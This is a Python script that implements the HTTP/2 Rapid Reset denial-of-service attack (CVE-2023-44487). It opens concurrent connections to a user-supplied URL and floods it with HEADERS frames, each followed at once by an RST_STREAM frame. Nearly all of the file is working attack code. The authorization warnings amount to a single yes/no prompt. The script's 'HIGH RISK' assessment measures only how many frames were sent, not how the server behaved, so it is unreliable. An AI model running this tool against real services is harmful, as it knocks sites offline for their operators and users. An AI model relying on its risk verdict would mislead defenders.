#!/usr/bin/env python3
"""
CVE-2023-44487 HTTP/2 Rapid Reset Attack Testing Tool

This script implements a test for the HTTP/2 Rapid Reset vulnerability (CVE-2023-44487).
The vulnerability involves sending a large number of HTTP/2 stream requests followed
immediately by RST_STREAM frames to overwhelm the server.

WARNING: This tool is for educational and authorized testing purposes only.
Only use this against systems you own or have explicit permission to test.

Author: Security Testing Tool
License: MIT
"""

import argparse
import asyncio
import ssl
import socket
import struct
import time
import sys
import logging
from typing import Optional, List, Tuple
from dataclasses import dataclass
from urllib.parse import urlparse

# HTTP/2 Frame Types
FRAME_TYPE_DATA = 0x0
FRAME_TYPE_HEADERS = 0x1
FRAME_TYPE_PRIORITY = 0x2
FRAME_TYPE_RST_STREAM = 0x3
FRAME_TYPE_SETTINGS = 0x4
FRAME_TYPE_PUSH_PROMISE = 0x5
FRAME_TYPE_PING = 0x6
FRAME_TYPE_GOAWAY = 0x7
FRAME_TYPE_WINDOW_UPDATE = 0x8
FRAME_TYPE_CONTINUATION = 0x9

# HTTP/2 Frame Flags
FLAG_ACK = 0x1
FLAG_END_STREAM = 0x1
FLAG_END_HEADERS = 0x4
FLAG_PADDED = 0x8
FLAG_PRIORITY = 0x20

# HTTP/2 Settings
SETTINGS_HEADER_TABLE_SIZE = 0x1
SETTINGS_ENABLE_PUSH = 0x2
SETTINGS_MAX_CONCURRENT_STREAMS = 0x3
SETTINGS_INITIAL_WINDOW_SIZE = 0x4
SETTINGS_MAX_FRAME_SIZE = 0x5
SETTINGS_MAX_HEADER_LIST_SIZE = 0x6

# HTTP/2 Error Codes
ERROR_NO_ERROR = 0x0
ERROR_PROTOCOL_ERROR = 0x1
ERROR_INTERNAL_ERROR = 0x2
ERROR_FLOW_CONTROL_ERROR = 0x3
ERROR_SETTINGS_TIMEOUT = 0x4
ERROR_STREAM_CLOSED = 0x5
ERROR_FRAME_SIZE_ERROR = 0x6
ERROR_REFUSED_STREAM = 0x7
ERROR_CANCEL = 0x8

# HTTP/2 Connection Preface
HTTP2_CONNECTION_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'

@dataclass
class HTTP2Frame:
    """Represents an HTTP/2 frame"""
    length: int
    frame_type: int
    flags: int
    stream_id: int
    payload: bytes

    def to_bytes(self) -> bytes:
        """Convert frame to bytes for transmission"""
        header = struct.pack('!I', (self.length << 8) | self.frame_type)
        header += struct.pack('!BI', self.flags, self.stream_id & 0x7FFFFFFF)
        return header + self.payload

class HTTP2Connection:
    """HTTP/2 connection handler"""
    
    def __init__(self, host: str, port: int, use_ssl: bool = True):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.socket = None
        self.stream_id = 1
        self.settings_received = False
        self.max_concurrent_streams = 100
        
    async def connect(self) -> bool:
        """Establish connection and perform HTTP/2 handshake"""
        try:
            # Create socket connection
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            
            if self.use_ssl:
                context = ssl.create_default_context()
                context.set_alpn_protocols(['h2'])
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                self.socket = context.wrap_socket(self.socket, server_hostname=self.host)
            
            await asyncio.get_event_loop().run_in_executor(
                None, self.socket.connect, (self.host, self.port)
            )
            
            # Send HTTP/2 connection preface
            await self._send_raw(HTTP2_CONNECTION_PREFACE)
            
            # Send initial SETTINGS frame
            await self._send_settings()
            
            # Wait for server's SETTINGS frame
            await self._read_settings_response()
            
            return True
            
        except Exception as e:
            logging.error(f"Connection failed: {e}")
            return False
    
    async def _send_raw(self, data: bytes):
        """Send raw bytes over the connection"""
        await asyncio.get_event_loop().run_in_executor(
            None, self.socket.send, data
        )
    
    async def _send_frame(self, frame: HTTP2Frame):
        """Send an HTTP/2 frame"""
        await self._send_raw(frame.to_bytes())
    
    async def _send_settings(self):
        """Send initial SETTINGS frame"""
        settings = struct.pack('!HI', SETTINGS_ENABLE_PUSH, 0)  # Disable server push
        settings += struct.pack('!HI', SETTINGS_MAX_CONCURRENT_STREAMS, 1000)
        settings += struct.pack('!HI', SETTINGS_INITIAL_WINDOW_SIZE, 65535)
        
        frame = HTTP2Frame(
            length=len(settings),
            frame_type=FRAME_TYPE_SETTINGS,
            flags=0,
            stream_id=0,
            payload=settings
        )
        await self._send_frame(frame)
    
    async def _read_settings_response(self):
        """Read and acknowledge server's SETTINGS frame"""
        try:
            # Read frame header (9 bytes)
            header_data = await asyncio.get_event_loop().run_in_executor(
                None, self.socket.recv, 9
            )
            
            if len(header_data) < 9:
                return
            
            # Parse frame header
            length_and_type = struct.unpack('!I', header_data[:4])[0]
            length = length_and_type >> 8
            frame_type = length_and_type & 0xFF
            flags, stream_id = struct.unpack('!BI', header_data[4:])
            
            # Read payload if present
            payload = b''
            if length > 0:
                payload = await asyncio.get_event_loop().run_in_executor(
                    None, self.socket.recv, length
                )
            
            # If it's a SETTINGS frame, send ACK
            if frame_type == FRAME_TYPE_SETTINGS and not (flags & FLAG_ACK):
                ack_frame = HTTP2Frame(
                    length=0,
                    frame_type=FRAME_TYPE_SETTINGS,
                    flags=FLAG_ACK,
                    stream_id=0,
                    payload=b''
                )
                await self._send_frame(ack_frame)
                self.settings_received = True
                
                # Parse settings to get max concurrent streams
                self._parse_settings(payload)
                
        except Exception as e:
            logging.warning(f"Error reading settings response: {e}")
    
    def _parse_settings(self, payload: bytes):
        """Parse SETTINGS frame payload"""
        offset = 0
        while offset < len(payload):
            if offset + 6 <= len(payload):
                setting_id, value = struct.unpack('!HI', payload[offset:offset+6])
                if setting_id == SETTINGS_MAX_CONCURRENT_STREAMS:
                    self.max_concurrent_streams = min(value, 1000)  # Cap at 1000 for safety
                offset += 6
            else:
                break
    
    async def send_headers_frame(self, path: str = '/', headers: Optional[dict] = None) -> int:
        """Send a HEADERS frame and return the stream ID"""
        current_stream_id = self.stream_id
        self.stream_id += 2  # Client streams are odd numbers
        
        # Build pseudo-headers (required for HTTP/2)
        pseudo_headers = [
            (b':method', b'GET'),
            (b':path', path.encode('utf-8')),
            (b':scheme', b'https' if self.use_ssl else b'http'),
            (b':authority', self.host.encode('utf-8'))
        ]
        
        # Add custom headers if provided
        if headers:
            for name, value in headers.items():
                pseudo_headers.append((name.encode('utf-8'), value.encode('utf-8')))
        
        # Simple HPACK encoding (literal header field without indexing)
        payload = b''
        for name, value in pseudo_headers:
            # Format: 0xxxxxxx (literal header field without indexing)
            payload += b'\x00'  # No indexing, new name
            payload += struct.pack('!B', len(name)) + name
            payload += struct.pack('!B', len(value)) + value
        
        frame = HTTP2Frame(
            length=len(payload),
            frame_type=FRAME_TYPE_HEADERS,
            flags=FLAG_END_HEADERS | FLAG_END_STREAM,
            stream_id=current_stream_id,
            payload=payload
        )
        
        await self._send_frame(frame)
        return current_stream_id
    
    async def send_rst_stream(self, stream_id: int, error_code: int = ERROR_CANCEL):
        """Send a RST_STREAM frame"""
        payload = struct.pack('!I', error_code)
        frame = HTTP2Frame(
            length=4,
            frame_type=FRAME_TYPE_RST_STREAM,
            flags=0,
            stream_id=stream_id,
            payload=payload
        )
        await self._send_frame(frame)
    
    async def rapid_reset_attack(self, num_requests: int = 100, delay: float = 0.001) -> int:
        """
        Perform the Rapid Reset attack
        
        Args:
            num_requests: Number of request/reset cycles to perform
            delay: Delay between HEADERS and RST_STREAM frames
            
        Returns:
            Number of successful request/reset cycles
        """
        successful_attacks = 0
        
        logging.info(f"Starting Rapid Reset attack with {num_requests} requests")
        
        for i in range(num_requests):
            try:
                # Send HEADERS frame
                stream_id = await self.send_headers_frame('/')
                
                # Optional small delay (part of the attack pattern)
                if delay > 0:
                    await asyncio.sleep(delay)
                
                # Immediately send RST_STREAM to cancel the request
                await self.send_rst_stream(stream_id, ERROR_CANCEL)
                
                successful_attacks += 1
                
                if (i + 1) % 10 == 0:
                    logging.info(f"Sent {i + 1}/{num_requests} request/reset cycles")
                
            except Exception as e:
                logging.error(f"Error in attack cycle {i}: {e}")
                break
        
        return successful_attacks
    
    def close(self):
        """Close the connection"""
        if self.socket:
            self.socket.close()

class RapidResetTester:
    """Main testing class for CVE-2023-44487"""
    
    def __init__(self, target_url: str, num_connections: int = 1, requests_per_connection: int = 100):
        self.target_url = target_url
        self.num_connections = num_connections
        self.requests_per_connection = requests_per_connection
        
        # Parse URL
        parsed = urlparse(target_url)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        self.use_ssl = parsed.scheme == 'https'
        
        if not self.host:
            raise ValueError("Invalid URL provided")
    
    async def test_single_connection(self, connection_id: int) -> Tuple[bool, int]:
        """Test a single connection"""
        logging.info(f"Connection {connection_id}: Establishing HTTP/2 connection to {self.host}:{self.port}")
        
        conn = HTTP2Connection(self.host, self.port, self.use_ssl)
        
        try:
            # Establish connection
            if not await conn.connect():
                logging.error(f"Connection {connection_id}: Failed to establish connection")
                return False, 0
            
            logging.info(f"Connection {connection_id}: HTTP/2 connection established")
            
            # Perform rapid reset attack
            successful_attacks = await conn.rapid_reset_attack(
                num_requests=self.requests_per_connection,
                delay=0.001  # 1ms delay between HEADERS and RST_STREAM
            )
            
            logging.info(f"Connection {connection_id}: Completed {successful_attacks}/{self.requests_per_connection} attacks")
            
            return True, successful_attacks
            
        except Exception as e:
            logging.error(f"Connection {connection_id}: Error during test: {e}")
            return False, 0
            
        finally:
            conn.close()
    
    async def run_test(self) -> dict:
        """Run the complete test"""
        logging.info(f"Starting CVE-2023-44487 Rapid Reset test against {self.target_url}")
        logging.info(f"Test configuration: {self.num_connections} connections, {self.requests_per_connection} requests per connection")
        
        start_time = time.time()
        
        # Run connections concurrently
        tasks = []
        for i in range(self.num_connections):
            task = asyncio.create_task(self.test_single_connection(i + 1))
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Analyze results
        successful_connections = 0
        total_successful_attacks = 0
        
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                logging.error(f"Connection {i + 1}: Exception occurred: {result}")
            else:
                success, attacks = result
                if success:
                    successful_connections += 1
                    total_successful_attacks += attacks
        
        # Calculate statistics
        total_intended_requests = self.num_connections * self.requests_per_connection
        success_rate = (total_successful_attacks / total_intended_requests) * 100 if total_intended_requests > 0 else 0
        requests_per_second = total_successful_attacks / duration if duration > 0 else 0
        
        test_results = {
            'target_url': self.target_url,
            'num_connections': self.num_connections,
            'requests_per_connection': self.requests_per_connection,
            'successful_connections': successful_connections,
            'total_successful_attacks': total_successful_attacks,
            'total_intended_requests': total_intended_requests,
            'success_rate': success_rate,
            'duration': duration,
            'requests_per_second': requests_per_second
        }
        
        return test_results

def print_banner():
    """Print tool banner"""
    banner = """
╔══════════════════════════════════════════════════════════════════════╗
║                    CVE-2023-44487 Rapid Reset Tester                 ║
║                                                                      ║
║  HTTP/2 Rapid Reset Attack Testing Tool                             ║
║  WARNING: For authorized testing only!                              ║
╚══════════════════════════════════════════════════════════════════════╝
    """
    print(banner)

def print_results(results: dict):
    """Print test results"""
    print("\n" + "="*70)
    print("TEST RESULTS")
    print("="*70)
    print(f"Target URL:                {results['target_url']}")
    print(f"Connections:              {results['num_connections']}")
    print(f"Requests per connection:  {results['requests_per_connection']}")
    print(f"Successful connections:   {results['successful_connections']}")
    print(f"Total successful attacks: {results['total_successful_attacks']}")
    print(f"Total intended requests:  {results['total_intended_requests']}")
    print(f"Success rate:             {results['success_rate']:.2f}%")
    print(f"Duration:                 {results['duration']:.2f} seconds")
    print(f"Requests per second:      {results['requests_per_second']:.2f}")
    print("="*70)

def setup_logging(verbose: bool = False):
    """Setup logging configuration"""
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format='%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%H:%M:%S'
    )

async def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='CVE-2023-44487 HTTP/2 Rapid Reset Attack Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python rapid_reset_test.py https://example.com
  python rapid_reset_test.py https://example.com --connections 5 --requests 200
  python rapid_reset_test.py https://example.com:8443 --verbose

WARNING: This tool is for educational and authorized testing purposes only.
Only use this against systems you own or have explicit permission to test.
        """
    )
    
    parser.add_argument('url', help='Target URL (e.g., https://example.com)')
    parser.add_argument('-c', '--connections', type=int, default=1,
                       help='Number of concurrent connections (default: 1)')
    parser.add_argument('-r', '--requests', type=int, default=100,
                       help='Number of requests per connection (default: 100)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose logging')
    parser.add_argument('--no-banner', action='store_true',
                       help='Suppress banner output')
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.connections < 1 or args.connections > 100:
        print("Error: Number of connections must be between 1 and 100")
        sys.exit(1)
    
    if args.requests < 1 or args.requests > 10000:
        print("Error: Number of requests must be between 1 and 10000")
        sys.exit(1)
    
    # Setup
    if not args.no_banner:
        print_banner()
    
    setup_logging(args.verbose)
    
    # Safety warning
    print("⚠️  WARNING: This tool performs a Denial of Service attack!")
    print("⚠️  Only use against systems you own or have explicit permission to test.")
    print("⚠️  Unauthorized use may be illegal and could cause service disruption.")
    
    response = input("\nDo you have authorization to test the target? (yes/no): ")
    if response.lower() not in ['yes', 'y']:
        print("Test aborted. Only use this tool with proper authorization.")
        sys.exit(0)
    
    try:
        # Create and run tester
        tester = RapidResetTester(
            target_url=args.url,
            num_connections=args.connections,
            requests_per_connection=args.requests
        )
        
        results = await tester.run_test()
        print_results(results)
        
        # Assessment
        if results['success_rate'] > 80:
            print("\n🔴 HIGH RISK: Target appears vulnerable to Rapid Reset attacks")
            print("   Consider updating HTTP/2 implementation and enabling rate limiting")
        elif results['success_rate'] > 50:
            print("\n🟡 MEDIUM RISK: Target may be partially vulnerable")
            print("   Review HTTP/2 configuration and monitoring")
        else:
            print("\n🟢 LOW RISK: Target appears to have mitigations in place")
            print("   Continue monitoring and keep systems updated")
        
    except KeyboardInterrupt:
        print("\n\nTest interrupted by user")
        sys.exit(1)
    except Exception as e:
        logging.error(f"Test failed: {e}")
        sys.exit(1)

if __name__ == '__main__':
    asyncio.run(main())